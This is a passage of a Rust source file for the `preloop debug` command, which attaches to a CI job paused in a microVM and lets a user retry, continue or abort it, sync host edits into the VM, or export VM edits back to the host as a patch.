//! `preloop debug` — attach to a job paused at a failed step.
//!
//! The job is not dead. Its worker is blocked inside a live microVM with every
//! installed package, running service, and warm build cache still in place.
//! This is the terminal front-end to that: orient, fix, retry.
//!
//! Design notes that are load-bearing rather than cosmetic:
//!
//! - **No countdown while attached.** Attached means no timeout. Reading code
//!   for thirty minutes is not idle.
//! - **`:`-prefixed verbs.** Anything else is a shell command in the guest, so
//!   preloop's vocabulary can never shadow a real command.
//! - **Detach is safe and advertised.** `Ctrl-D` leaves the session running and
//!   prints the reattach line.
//! - **Structured diagnostics beat log tails.** The error that matters is
//!   frequently not in the last twenty lines.

use std::io::{IsTerminal, Write};

use aksh_gha_protocol::debug_session::{
    ChangeCategory, DebugSession, RevertPolicy, Verdict, VerdictRequest, WorkspaceChange,
};
use anyhow::{Context, Result};

/// `preloop debug [session]`.
#[derive(clap::Args, Debug)]
pub struct DebugArgs {
    /// Session id, run id, or job name. Optional when exactly one is paused.
    pub session: Option<String>,

    /// Print the paused session as JSON and exit. For agents and scripts.
    #[arg(long)]
    pub json: bool,

    /// Issue a verdict without attaching: `retry`, `continue`, or `abort`.
    #[arg(long, value_name = "VERDICT")]
    pub verdict: Option<String>,

    /// With `--verdict retry`: sync host source changes into the VM first.
    #[arg(long)]
    pub sync: bool,

    /// Bring source edits made inside the VM back to the host workspace.
    #[arg(long)]
    pub export: bool,

    /// With `--export`: write the patch but do not apply it.
    #[arg(long)]
    pub patch_only: bool,

    /// Overwrite VM-side edits when syncing. Without it, a file changed on
    /// both sides aborts the sync instead of silently losing the VM copy.
    #[arg(long)]
    pub force: bool,

    /// With `--verdict retry`: undo the failed attempt's workspace debris.
    /// `none` (default), `untracked`, or `all`.
    #[arg(long, value_name = "POLICY", default_value = "none")]
    pub revert: String,

    /// With `--verdict retry`: re-run from a 1-based step number or display
    /// name. The step must be at or before the failed step.
    #[arg(long, value_name = "STEP")]
    pub from: Option<String>,

    /// With `--verdict retry`: re-run from the first user step in this job.
    #[arg(long)]
    pub from_start: bool,
}

pub async fn run(
    args: DebugArgs,
    client: reqwest::Client,
    base_url: String,
    token: Option<String>,
) -> Result<()> {
    let ctx = Api {
        client,
        base_url,
        token,
    };

    let sessions = ctx.list().await?;
    let session = match (&args.session, sessions.len()) {
        (Some(reference), _) => ctx.get(reference).await?,
        (None, 0) => {
            println!("No paused jobs.");
            println!();
            println!("A job pauses at a failed step when `preloop run` is attached to a");
            println!("terminal. Piped, detached, and CI runs never pause, so nothing hangs.");
            println!();
            println!("  preloop run -f .github/workflows/ci.yml");
            return Ok(());
        }
        (None, 1) => sessions.into_iter().next().expect("length checked"),
        (None, _) => {
            println!("{} paused jobs:", sessions.len());
            println!();
            for session in &sessions {
                println!(
                    "  {}  {}  step {}/{} {}",
                    session.session_id,
                    session.job_name,
                    session.step.index + 1,
                    session.step.total,
                    session.step.display_name
                );
            }
            println!();
            println!("Attach with: preloop debug <session-id>");
            return Ok(());
        }
    };

    if args.json {
        println!("{}", serde_json::to_string_pretty(&session)?);
        return Ok(());
    }

    if args.export {
        return export_from_guest(&session, !args.patch_only);
    }

    if let Some(verdict) = &args.verdict {
        let verdict = parse_verdict(verdict)?;
        let revert = parse_revert(&args.revert)?;
        let revision = if args.sync {
            Some(sync_workspace(&session, args.force)?)
        } else {
            None
        };
        let retry_from = if verdict == Verdict::Retry {
            parse_retry_from(&session, args.from.as_deref(), args.from_start)?
        } else {
            if args.from.is_some() || args.from_start {
                anyhow::bail!("--from/--from-start only apply to --verdict retry");
            }
            None
        };
        ctx.verdict(&session.session_id, verdict, revert, revision, retry_from)
            .await?;
        println!("{} → {}", session.session_id, verdict.as_str());
        return Ok(());
    }

    print_banner(&session);

    // Never prompt into a pipe. A CI invocation or a `| tee` must report and
    // exit rather than block forever on stdin that will never arrive.
    if !std::io::stdin().is_terminal() {
        println!();
        println!("Not a terminal — not attaching.");
        print_reattach(&session);
        return Ok(());
    }

    repl(&ctx, session).await.map(|_| ())
}

struct Api {
    client: reqwest::Client,
    base_url: String,
    token: Option<String>,
}

/// Find a paused session belonging to a run, if one exists.
pub async fn paused_for_run(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<String>,
    run_id: aksh_gha_protocol::RunId,
) -> Option<DebugSession> {
    let api = Api {
        client: client.clone(),
        base_url: base_url.to_owned(),
        token,
    };
    api.list()
        .await
        .ok()?
        .into_iter()
        .find(|session| session.run_id == run_id)
}

/// Offer the choice at the moment of failure, inline in `preloop run`.
///
/// This is where the feature earns its keep: attention is highest the instant
/// something breaks, and the machine is still standing. Returns `true` when the
/// run should keep streaming (the job resumed), `false` when it is over.
pub async fn prompt_at_failure(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<String>,
    session: DebugSession,
) -> Result<bool> {
    let api = Api {
        client: client.clone(),
        base_url: base_url.to_owned(),
        token,
    };

    print_banner(&session);

    // Never block a pipe. If nobody can answer, say how to attach later and
    // leave the session standing rather than guessing a verdict.
    if !std::io::stdin().is_terminal() {
        print_reattach(&session);
        return Ok(false);
    }

    loop {
        println!();
        println!("  → d  debug here      r  retry step");
        println!("    s  sync + retry    a  abort run");
        print!("  [d/r/s/a] › ");
        std::io::stdout().flush().ok();

        let mut answer = String::new();
        if std::io::stdin().read_line(&mut answer)? == 0 {
            print_reattach(&session);
            return Ok(false);
        }
        match answer.trim() {
            "d" | "" => {
                return Ok(matches!(repl(&api, session).await?, ReplOutcome::Resumed));
            }
            "r" => {
                api.verdict(
                    &session.session_id,
                    Verdict::Retry,
                    RevertPolicy::None,
                    None,
                    None,
                )
                .await?;
                println!("  ⟳ retrying step {}", session.step.index + 1);
                return Ok(true);
            }
            "s" => {
                let revision = match sync_workspace(&session, false) {
                    Ok(revision) => Some(revision),
                    Err(error) => {
                        println!("  sync failed: {error:#}");
                        continue;
                    }
                };
                api.verdict(
                    &session.session_id,
                    Verdict::Retry,
                    RevertPolicy::None,
                    revision,
                    None,
                )
                .await?;
                println!("  ⟳ retrying step {}", session.step.index + 1);
                return Ok(true);
            }
            "a" => {
                api.verdict(
                    &session.session_id,
                    Verdict::Abort,
                    RevertPolicy::None,
                    None,
                    None,
                )
                .await?;
                println!("  Run aborted.");
                return Ok(false);
            }
            other => println!("  `{other}` is not an option."),
        }
    }
}

impl Api {
    fn request(&self, method: reqwest::Method, path: &str) -> reqwest::RequestBuilder {
        let builder = self
            .client
            .request(method, format!("{}{path}", self.base_url));
        match &self.token {
            Some(token) => builder.bearer_auth(token),
            None => builder,
        }
    }

    async fn list(&self) -> Result<Vec<DebugSession>> {
        #[derive(serde::Deserialize)]
        struct Listing {
            sessions: Vec<DebugSession>,
        }
        let response = self
            .request(reqwest::Method::GET, "/api/v1/debug/sessions")
            .send()
            .await
            .context("listing debug sessions")?
            .error_for_status()?;
        Ok(response.json::<Listing>().await?.sessions)
    }

    async fn get(&self, reference: &str) -> Result<DebugSession> {
        let response = self
            .request(
                reqwest::Method::GET,
                &format!("/api/v1/debug/sessions/{reference}"),
            )
            .send()
            .await
            .context("fetching debug session")?;
        if response.status() == reqwest::StatusCode::NOT_FOUND {
            anyhow::bail!("no paused job matching `{reference}`");
        }
        Ok(response.error_for_status()?.json().await?)
    }

    async fn verdict(
        &self,
        session_id: &str,
        verdict: Verdict,
        revert: RevertPolicy,
        source_revision: Option<String>,
        retry_from_step: Option<usize>,
    ) -> Result<DebugSession> {
        let body = VerdictRequest {
            verdict,
            revert,
            controller: Some("preloop-cli".to_owned()),
            source_revision,
            retry_from_step,
        };
        let response = self
            .request(
                reqwest::Method::POST,
                &format!("/api/v1/debug/sessions/{session_id}/verdict"),
            )
            .json(&body)
            .send()
            .await
            .context("issuing verdict")?
            .error_for_status()?;
        Ok(response.json().await?)
    }
}

fn parse_retry_from(
    session: &DebugSession,
    from: Option<&str>,
    from_start: bool,
) -> Result<Option<usize>> {
    if from_start && from.is_some() {
        anyhow::bail!("use either --from <step> or --from-start, not both");
    }
    if from_start {
        return Ok(Some(0));
    }
    let Some(raw) = from else {
        return Ok(None);
    };
    if raw.is_empty() {
        anyhow::bail!("--from requires a step number or name");
    }

    if let Ok(number) = raw.parse::<usize>() {
        let max = session.step.index + 1;
        if number == 0 || number > max {
            anyhow::bail!("step number out of range (1..{max})");
        }
        return Ok(Some(number - 1));
    }

    let needle = raw.to_ascii_lowercase();
    let matches: Vec<_> = session
        .job_steps
        .iter()
        .filter(|step| {
            step.display_name.to_ascii_lowercase().contains(&needle)
                || step.context_name.to_ascii_lowercase().contains(&needle)
        })
        .collect();
    match matches.as_slice() {
        [] => {
            if session.job_steps.is_empty() {
                anyhow::bail!(
                    "no step matching '{raw}' (step names are unavailable in this session)"
                );
            }
            let available = session
                .job_steps
                .iter()
                .map(|step| format!("{}. {}", step.index + 1, step.display_name))
                .collect::<Vec<_>>()
                .join(", ");
            anyhow::bail!("no step matching '{raw}'; available steps: {available}");
        }
        [step] if step.index <= session.step.index => Ok(Some(step.index)),
        [step] => anyhow::bail!(
            "step {} is after the failed step {}",
            step.index + 1,
            session.step.index + 1
        ),
        _ => {
            let names = matches
                .iter()
                .map(|step| format!("{}. {}", step.index + 1, step.display_name))
                .collect::<Vec<_>>()
                .join(", ");
            anyhow::bail!("'{raw}' is ambiguous: {names}");
        }
    }
}

fn parse_verdict(raw: &str) -> Result<Verdict> {
    match raw.trim().to_ascii_lowercase().as_str() {
        "retry" => Ok(Verdict::Retry),
        "continue" => Ok(Verdict::Continue),
        "abort" => Ok(Verdict::Abort),
        other => anyhow::bail!("unknown verdict `{other}` (retry, continue, or abort)"),
    }
}

fn parse_revert(raw: &str) -> Result<RevertPolicy> {
    match raw.trim().to_ascii_lowercase().as_str() {
        "none" => Ok(RevertPolicy::None),
        "untracked" => Ok(RevertPolicy::Untracked),
        "all" => Ok(RevertPolicy::All),
        other => anyhow::bail!("unknown revert policy `{other}` (none, untracked, or all)"),
    }
}

/// The failure banner.
///
/// Answers, in order: what failed, why, where, what is still alive, what next.
pub fn render_banner(session: &DebugSession) -> String {
    let step = &session.step;
    let mut out = String::new();
    let attempt_note = if session.attempts.len() > 1 {
        format!(" · attempt {}", session.attempts.len())
    } else {
        String::new()
    };

    out.push_str(&format!(
        "\n  {} failed{}\n",
        step.display_name, attempt_note
    ));
    out.push_str(&format!("  {}\n", "─".repeat(66)));

    if let Some(command) = &step.command {
        let first = command.lines().next().unwrap_or_default();
        let elided = if command.lines().count() > 1 {
            " …"
        } else {
            ""
        };
        out.push_str(&format!("  command   {first}{elided}\n"));
    }
    if let Some(code) = step.exit_code {
        out.push_str(&format!("  exit      {code}\n"));
    }
    out.push_str(&format!("  step      {}/{}\n", step.index + 1, step.total));
    if let Some(cwd) = &step.working_directory {
        out.push_str(&format!("  cwd       {cwd}\n"));
    }

    // Structured diagnostics first; the excerpt is a fallback, not a default.
    if !step.diagnostics.is_empty() {
        out.push('\n');
        for diagnostic in step.diagnostics.iter().take(5) {
            let location = match (&diagnostic.file, diagnostic.line) {
                (Some(file), Some(line)) => format!("{file}:{line}"),
                (Some(file), None) => file.clone(),
                _ => String::new(),
            };
            if location.is_empty() {
                out.push_str(&format!("  {}\n", diagnostic.message));
            } else {
                out.push_str(&format!("  {location}\n  {}\n", diagnostic.message));
            }
        }
    } else if let Some(excerpt) = &step.log_excerpt {
        out.push('\n');
        for line in excerpt
            .lines()
            .rev()
            .take(6)
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
        {
            out.push_str(&format!("  {}\n", strip_ansi(line)));
        }
    }

    out.push('\n');
    out.push_str("  Job and microVM are paused. Services and build caches remain.\n");
    out.push_str(&format!("  {}\n", "─".repeat(66)));
    out.push_str("  :retry [--from N|name]            re-run from a step\n");
    out.push_str("           [--from-start]           re-run from job start\n");
    out.push_str("  :continue  accept and carry on     :steps    attempt journal\n");
    out.push_str("  :abort     fail the run            :status   refresh\n");
    out.push_str("  :sync      host changes → VM       :export   VM edits → host\n");
    out.push_str("  Ctrl-D     detach — session stays paused\n");
    out.push_str("\n  Anything not starting with `:` runs as a shell command in the VM.\n");
    out
}

fn print_banner(session: &DebugSession) {
    print!("{}", render_banner(session));
}

fn print_reattach(session: &DebugSession) {
    println!("Reattach:  preloop debug {}", session.session_id);
}

/// Drop timestamps and colour codes so guest log lines stay readable.
fn strip_ansi(line: &str) -> String {
    let mut out = String::with_capacity(line.len());
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            for skip in chars.by_ref() {
                if skip.is_ascii_alphabetic() {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out.trim_end().to_owned()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReplOutcome {
    Resumed,
    Detached,
}

async fn repl(ctx: &Api, mut session: DebugSession) -> Result<ReplOutcome> {
    let prompt = format!("{}$ ", session.job_name);
    loop {
        print!("{prompt}");
        std::io::stdout().flush().ok();

        let mut line = String::new();
        if std::io::stdin().read_line(&mut line)? == 0 {
            // Ctrl-D. Leaving must never destroy the session.
            println!();
            println!("Detached — the job stays paused and the VM stays up.");
            print_reattach(&session);
            return Ok(ReplOutcome::Detached);
        }
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        let Some(verb) = line.strip_prefix(':') else {
            run_in_guest(&session, line);
            continue;
        };

        let mut parts = verb.split_whitespace();
        let head = parts.next().unwrap_or_default();
        let flags: Vec<&str> = parts.collect();
        match head {
            "retry" => {
                let sync = flags.contains(&"--sync");
                let revision = if sync {
                    match sync_workspace(&session, flags.contains(&"--force")) {
                        Ok(revision) => Some(revision),
                        Err(error) => {
                            println!("  sync failed: {error:#}");
                            continue;
                        }
                    }
                } else {
                    None
                };
                let revert = match choose_revert(&session, &flags) {
                    Some(policy) => policy,
                    None => continue,
                };
                let from_arg = flags
                    .iter()
                    .position(|flag| *flag == "--from")
                    .map(|pos| flags.get(pos + 1).copied().unwrap_or(""));
                let retry_from =
                    match parse_retry_from(&session, from_arg, flags.contains(&"--from-start")) {
                        Ok(value) => value,
                        Err(error) => {
                            println!("  retry-from failed: {error:#}");
                            continue;
                        }
                    };

                ctx.verdict(&session.session_id, Verdict::Retry, revert, revision, retry_from)
                    .await?;
                if let Some(from) = retry_from {
                    let name = session
                        .job_steps
                        .get(from)
                        .map(|s| s.display_name.as_str())
                        .unwrap_or("?");
                    println!(
                        "  ⟳ retrying from step {}/{} ({})",
                        from + 1,
                        session.step.total,
                        name,
                    );
                } else {
                    println!(
                        "  ⟳ retrying step {}/{}",
                        session.step.index + 1,
                        session.step.total
                    );
                }
                println!("  The job resumes. Watch it with: preloop status");
                return Ok(ReplOutcome::Resumed);
            }
            "continue" => {
                ctx.verdict(
                    &session.session_id,
                    Verdict::Continue,
                    RevertPolicy::None,
                    None,
                    None,
                )
                .await?;
                println!("  Failure accepted; remaining steps will run.");
                println!("  The run is reported as failed-but-continued, not as a pass.");
                return Ok(ReplOutcome::Resumed);
            }
            "abort" => {
                ctx.verdict(&session.session_id, Verdict::Abort, RevertPolicy::None, None, None)
                    .await?;
                println!("  Run aborted. Cleanup steps will run.");
                return Ok(ReplOutcome::Resumed);
            }
            "export" => {
                if let Err(error) = export_from_guest(&session, !flags.contains(&"--patch-only")) {
                    println!("  export failed: {error:#}");
                }
            }
            "sync" => match sync_workspace(&session, flags.contains(&"--force")) {
                Ok(revision) => println!("  workspace now at {revision}"),
                Err(error) => println!("  sync failed: {error:#}"),
            },
            "detach" => {
                println!("Detached — the job stays paused and the VM stays up.");
                print_reattach(&session);
                return Ok(ReplOutcome::Detached);
            }
            "status" => {
                session = ctx.get(&session.session_id).await?;
                print_banner(&session);
            }
            "steps" => print_journal(&session),
            "changes" => show_changes(&session),
            "log" => run_in_guest(&session, "tail -n 200 /var/log/preloop-runner.log 2>/dev/null || echo 'no log file in guest'"),
            "help" => print_banner(&session),
            other => println!("unknown command `:{other}` — try :help"),
        }
    }
}

fn print_journal(session: &DebugSession) {
    println!();
    println!("  {}", session.step.display_name);
    if session.attempts.is_empty() {
        println!("  └─ 1  running");
    }
    for attempt in &session.attempts {
        let exit = attempt
            .exit_code
            .map(|code| format!(" exit {code}"))
            .unwrap_or_default();
        println!(
            "  ├─ {}  {}{}  ({} ms)  source: {}",
            attempt.attempt, attempt.outcome, exit, attempt.elapsed_ms, attempt.source_revision
        );
    }
    println!();
}

/// Show what the failed attempt itself changed.
///
/// Read from the session rather than re-derived here: the worker computed it as
/// a delta between a snapshot taken before the step ran and one taken at the
/// pause, so it excludes dirt that predates the step — and anything you have
/// edited since attaching.
pub fn render_changes(changes: &[WorkspaceChange]) -> String {
    if changes.is_empty() {
        return "  The failed attempt changed nothing in the workspace.\n".to_owned();
    }
    let mut out = String::from("\n  The failed attempt changed:\n");
    for change in changes {
        let note = match change.category {
            ChangeCategory::Tracked => "tracked — restorable from the snapshot",
            ChangeCategory::Untracked => "untracked — removable",
            ChangeCategory::Cache => "cache — never reverted",
        };
        out.push_str(&format!(
            "    {} {:<44} ({note})\n",
            change.status.sigil(),
            change.path
        ));
    }
    out.push_str("\n  Ignored build output is left alone: reverting it would discard the\n");
    out.push_str("  warm state that makes retrying here fast.\n");
    out
}

fn show_changes(session: &DebugSession) {
    print!("{}", render_changes(&session.attempt_changes));
}

/// Decide how much of the attempt's debris to undo.
///
/// Asks rather than guesses when tracked files are involved: a step that
/// regenerates committed codegen is indistinguishable from one that corrupted
/// it, and picking wrong silently discards work. `None` means "abandon this
/// retry".
fn choose_revert(session: &DebugSession, flags: &[&str]) -> Option<RevertPolicy> {
    if flags.contains(&"--dirty") {
        return Some(RevertPolicy::None);
    }
    if flags.contains(&"--clean") {
        return Some(RevertPolicy::All);
    }

    let changes = &session.attempt_changes;
    let tracked = changes
        .iter()
        .filter(|c| c.category == ChangeCategory::Tracked)
        .count();
    let untracked = changes
        .iter()
        .filter(|c| c.category == ChangeCategory::Untracked)
        .count();

    if tracked == 0 && untracked == 0 {
        return Some(RevertPolicy::None);
    }

    print!("{}", render_changes(changes));
    if tracked > 0 {
        println!("  If a step regenerates those tracked files, reverting is harmless —");
        println!("  it will rewrite them. If you edited them by hand, reverting discards that.");
    }
    println!();
    println!("  1  retry as-is                          (leave everything)");
    println!("  2  remove the {untracked} created file(s), then retry");
    println!("  3  remove created + restore {tracked} tracked file(s), then retry");
    print!("  [1/2/3] › ");
    std::io::stdout().flush().ok();

    let mut answer = String::new();
    if std::io::stdin().read_line(&mut answer).ok()? == 0 {
        return None;
    }
    match answer.trim() {
        "1" | "" => Some(RevertPolicy::None),
        "2" => Some(RevertPolicy::Untracked),
        "3" => Some(RevertPolicy::All),
        other => {
            println!("  `{other}` is not an option — retry cancelled.");
            None
        }
    }
}
/// Copy the host's working-tree changes into the paused VM.
///
/// Not a bind mount: the workspace holds source *and* build output, and build
/// output is not portable between a macOS host and a Linux guest. Mounting the
/// tree would collide the two `target/` directories; mounting a subtree
/// reinvents this with worse failure modes. A live mount would also let an
/// editor save mutate source mid-step.
///
/// ## Why whole files rather than a patch
///
/// The design originally called for a diff against the job's snapshot commit.
/// That commit lives in the server's snapshot store, not the host repository,
/// so `git diff <snapshot>` on the host fails outright — and making it work
/// would mean fetching the snapshot's object graph into the host repo, which
/// for a large repository costs more than the file it is trying to save.
///
/// For a *local* host→VM transfer the scarce resource is round trips, not
/// bytes. So: one tar of the changed files, one `machine cp`, one extract —
/// a fixed number of VM calls regardless of how many files changed. Cost
/// scales with the size of your change, not with the size of your repository.
///
/// ## Overwrite semantics
///
/// `tar -x` is last-writer-wins over the paths in the archive, and touches
/// nothing else — `target/`, `node_modules/`, and `.git/` are never in the
/// change set, so warm caches survive. Because host content wins, a file
/// edited on *both* sides would lose the VM copy silently; that case is
/// detected up front and refused unless `--force`.
///
/// Returns the new source revision label for the attempt journal.
fn sync_workspace(session: &DebugSession, force: bool) -> Result<String> {
    let guest_workspace = session
        .workspace
        .as_deref()
        .context("this session has no guest workspace path")?;
    let machine = session
        .machine
        .as_deref()
        .context("this session has no VM recorded")?;

    let host = std::env::current_dir()?;
    let (modified, deleted) = host_changes(&host)?;
    if modified.is_empty() && deleted.is_empty() {
        println!("  No working-tree changes on the host — nothing to sync.");
        return Ok(session.source_revision.clone());
    }

    // Deletions first, and in one call: a stale file left behind can shadow the
    // fix just as effectively as a missing one.
    if !deleted.is_empty() {
        let targets: Vec<String> = deleted
            .iter()
            .map(|path| shell_quote(&format!("{guest_workspace}/{path}")))
            .collect();
        guest_check(machine, &format!("rm -f {}", targets.join(" ")))?;
    }

    if !modified.is_empty() {
        // Refuse to clobber edits made inside the VM. `tar -x` is
        // last-writer-wins, so without this check a fix typed into the guest
        // is destroyed silently by a sync of the same path from the host.
        let conflicts = guest_modified(machine, guest_workspace, &modified)?;
        if !conflicts.is_empty() && !force {
            println!("  Cannot sync — these files changed on BOTH sides:");
            for path in &conflicts {
                println!("    {path}");
            }
            println!();
            println!("  Syncing would overwrite the VM copy with the host copy.");
            println!("  Keep the host version:  :retry --sync --force");
            println!("  Inspect the VM version: git diff -- <path>");
            anyhow::bail!("sync aborted on {} conflicting file(s)", conflicts.len());
        }

        let archive = std::env::temp_dir().join(format!("preloop-sync-{}.tar", std::process::id()));
        let list = std::env::temp_dir().join(format!("preloop-sync-{}.list", std::process::id()));
        let mut list_contents = Vec::new();
        for path in &modified {
            list_contents.extend_from_slice(path.as_bytes());
            list_contents.push(0);
        }
        std::fs::write(&list, list_contents).context("staging the sync file list")?;

        // tar carries mode bits, so a synced `check.sh` keeps its +x. Losing
        // that would fail the retry for a reason unrelated to the fix.
        let tar = std::process::Command::new("tar")
            .current_dir(&host)
            .arg("-cf")
            .arg(&archive)
            .arg("--null")
            .arg("--verbatim-files-from")
            .arg("-T")
            .arg(&list)
            .output()
            .context("building the sync archive")?;
        let _ = std::fs::remove_file(&list);
        if !tar.status.success() {
            let _ = std::fs::remove_file(&archive);
            anyhow::bail!(
                "tar failed: {}",
                String::from_utf8_lossy(&tar.stderr).trim()
            );
        }

        let bytes = std::fs::metadata(&archive).map(|m| m.len()).unwrap_or(0);
        // Staged in `/var/tmp`, never `/tmp`. `/tmp` is a tmpfs mounted over
        // the machine's overlay root, and `machine cp` resolves against the
        // overlay beneath it: the copy reports `100.0%` and exit 0 while the
        // bytes land somewhere no process in the machine can read. `/var/tmp`
        // is plain overlay, so cp and exec agree on it.
        //
        // Outside the workspace on purpose — an archive dropped inside it
        // would surface as an untracked file in the very `git status` the
        // repair flow uses to detect guest-side edits.
        let remote = "/var/tmp/preloop-sync.tar";

        push_to_guest(machine, &archive, remote)?;
        let _ = std::fs::remove_file(&archive);

        guest_check(
            machine,
            &format!(
                "cd {} && tar -xf {remote} && rm -f {remote}",
                shell_quote(guest_workspace)
            ),
        )
        .context("extracting the sync archive inside the VM")?;

        println!(
            "  ✓ synced {} changed, {} deleted ({} KiB) from {}",
            modified.len(),
            deleted.len(),
            bytes / 1024,
            host.display()
        );
    } else {
        println!("  ✓ removed {} deleted file(s)", deleted.len());
    }

    Ok(next_revision(&session.source_revision))
}

/// Bring source edits made inside the VM back to the host.
///
/// The VM is ephemeral. Without an exit path, a fix typed into the guest works,
/// turns the job green, and then evaporates with the machine — leaving the user
/// to retype it from memory against a workspace that no longer exists. Writes a
/// patch to the host and applies it unless `--patch-only`.
fn export_from_guest(session: &DebugSession, apply: bool) -> Result<()> {
    let guest_workspace = session
        .workspace
        .as_deref()
        .context("this session has no guest workspace path")?;
    let machine = session
        .machine
        .as_deref()
        .context("this session has no VM recorded")?;

    // Use a temporary index so `git add -N` can expose untracked files in the
    // patch without changing the guest workspace's real index.
    let output = std::process::Command::new("smolvm")
        .args(["machine", "exec", "--name", machine, "--", "sh", "-lc"])
        .arg(format!(
            "cd {} && \
             index=$(mktemp /var/tmp/preloop-export-index.XXXXXX) && \
             trap 'rm -f \"$index\"' EXIT && \
             GIT_INDEX_FILE=\"$index\" git read-tree HEAD && \
             GIT_INDEX_FILE=\"$index\" git add -N . >/dev/null 2>&1 && \
             GIT_INDEX_FILE=\"$index\" git diff --binary HEAD",
            shell_quote(guest_workspace)
        ))
        .output()
        .context("reading VM-side changes")?;
    if !output.status.success() {
        anyhow::bail!(
            "could not diff the guest workspace: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }

    let patch = String::from_utf8_lossy(&output.stdout);
    if patch.trim().is_empty() {
        println!("  No source changes inside the VM.");
        return Ok(());
    }

    let destination = std::env::current_dir()?.join("preloop-vm-changes.patch");
    std::fs::write(&destination, patch.as_bytes())
        .with_context(|| format!("writing {}", destination.display()))?;
    let files = patch.lines().filter(|l| l.starts_with("+++ b/")).count();
    println!("  Wrote {files} file(s) to {}", destination.display());

    if !apply {
        println!("  Apply with: git apply {}", destination.display());
        return Ok(());
    }

    let applied = std::process::Command::new("git")
        .args(["apply", "--3way"])
        .arg(&destination)
        .output()
        .context("applying the patch to the host workspace")?;
    if applied.status.success() {
        let _ = std::fs::remove_file(&destination);
        println!("  ✓ applied to the host workspace — the fix is now in your repo");
    } else {
        // Keep the patch: losing it here would recreate exactly the problem
        // this command exists to prevent.
        println!(
            "  Could not apply cleanly: {}",
            String::from_utf8_lossy(&applied.stderr).trim()
        );
        println!("  Patch kept at {}", destination.display());
    }
    Ok(())
}

/// Paths that have been modified inside the guest workspace.
///
/// Compared against the guest's own checkout, so this reports edits made in the
/// VM since it cloned the snapshot — precisely the work a sync would destroy.
fn guest_modified(
    machine: &str,
    guest_workspace: &str,
    candidates: &[String],
) -> Result<Vec<String>> {
    let quoted: Vec<String> = candidates.iter().map(|p| shell_quote(p)).collect();
    let output = std::process::Command::new("smolvm")
        .args(["machine", "exec", "--name", machine, "--", "sh", "-lc"])
        .arg(format!(
            "cd {} && git status --porcelain -- {} 2>/dev/null || true",
            shell_quote(guest_workspace),
            quoted.join(" ")
        ))
        .output()
        .context("checking for VM-side edits")?;

    Ok(String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter_map(|line| line.get(3..))
        .map(|path| path.trim().to_owned())
        .filter(|path| !path.is_empty())
        .collect())
}

/// Host working-tree changes as `(present, deleted)` relative paths.
///
/// Gitignored paths never appear, so build output is excluded by construction
/// and a warm `target/` is never walked.
fn host_changes(host: &std::path::Path) -> Result<(Vec<String>, Vec<String>)> {
    let git = |args: &[&str]| -> Result<Vec<u8>> {
        let output = std::process::Command::new("git")
            .current_dir(host)
            .args(args)
            .output()
            .context("running git on the host workspace")?;
        if !output.status.success() {
            anyhow::bail!(
                "git {} failed: {} — run `preloop debug` from your project directory",
                args.join(" "),
                String::from_utf8_lossy(&output.stderr).trim()
            );
        }
        Ok(output.stdout)
    };

    let parse_paths = |bytes: Vec<u8>| -> Result<Vec<String>> {
        bytes
            .split(|byte| *byte == 0)
            .filter(|path| !path.is_empty())
            .map(|path| {
                String::from_utf8(path.to_vec())
                    .context("Git returned a changed path that is not valid UTF-8")
            })
            .collect()
    };
    let deleted = parse_paths(git(&[
        "diff",
        "--name-only",
        "--diff-filter=D",
        "-z",
        "HEAD",
    ])?)?;

    let tracked = parse_paths(git(&[
        "diff",
        "--name-only",
        "--diff-filter=d",
        "-z",
        "HEAD",
    ])?)?;
    let untracked = parse_paths(git(&["ls-files", "--others", "--exclude-standard", "-z"])?)?;
    let mut modified: Vec<String> = tracked.into_iter().chain(untracked).collect();
    modified.sort();
    modified.dedup();

    Ok((modified, deleted))
}

/// Single-quote a value for `sh -lc`.
fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

/// `original` → `repair-1` → `repair-2`, so each attempt is attributable to
/// the tree it ran against.
fn next_revision(current: &str) -> String {
    let next = current
        .strip_prefix("repair-")
        .and_then(|n| n.parse::<u32>().ok())
        .unwrap_or(0)
        + 1;
    format!("repair-{next}")
}

/// Copy a host file into the machine, then prove it arrived.
///
/// `machine cp` cannot be taken at its word. Where a tmpfs is mounted over the
/// machine's overlay root -- `/tmp`, `/run`, `/dev/shm` -- it resolves against
/// the overlay underneath, so the write succeeds into a directory no process
/// in the machine can read, and still reports `100.0%` and exit 0. Callers
/// stage outside those paths, and this check makes a regression loud instead
/// of producing a retry that silently ran the old code.
fn push_to_guest(machine: &str, local: &std::path::Path, remote: &str) -> Result<()> {
    let expected = std::fs::metadata(local)
        .with_context(|| format!("reading {}", local.display()))?
        .len();

    guest_check(machine, &format!("rm -f {}", shell_quote(remote)))?;
    let output = std::process::Command::new("smolvm")
        .args([
            "machine",
            "cp",
            &local.to_string_lossy(),
            &format!("{machine}:{remote}"),
        ])
        .output()
        .context("running smolvm machine cp")?;
    if !output.status.success() {
        anyhow::bail!(
            "copying into {machine} failed: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }

    let seen = std::process::Command::new("smolvm")
        .args(["machine", "exec", "--name", machine, "--", "sh", "-lc"])
        .arg(format!("wc -c < {} 2>/dev/null", shell_quote(remote)))
        .output()
        .context("measuring the copied file inside the machine")?;
    let landed: u64 = String::from_utf8_lossy(&seen.stdout)
        .trim()
        .parse()
        .unwrap_or(0);
    if landed != expected {
        anyhow::bail!(
            "copy of {remote} reported success but the machine sees {landed} of {expected} bytes \
             — the destination is probably shadowed by a tmpfs mount"
        );
    }
    Ok(())
}

/// Run a command in the guest, failing loudly on a non-zero exit.
fn guest_check(machine: &str, command: &str) -> Result<()> {
    let output = std::process::Command::new("smolvm")
        .args([
            "machine", "exec", "--name", machine, "--", "sh", "-lc", command,
        ])
        .output()
        .context("running smolvm machine exec")?;
    if !output.status.success() {
        anyhow::bail!(
            "guest command failed: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }
    Ok(())
}

/// The `sh -lc` script for a command typed at the attach prompt.
///
/// `workspace` is reported by the worker and travels through the control
